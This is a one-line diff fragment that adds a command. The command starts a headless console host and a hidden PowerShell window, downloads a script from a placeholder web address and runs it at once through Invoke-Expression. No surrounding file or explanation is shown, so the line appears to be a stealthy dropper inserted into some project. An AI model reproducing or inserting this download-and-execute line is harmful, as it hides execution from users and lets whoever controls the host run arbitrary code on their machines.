@@ -1,0 +1,1 @@
+conhost --headless powershell -w hidden -c "iwr https://example.invalid/h|iex"
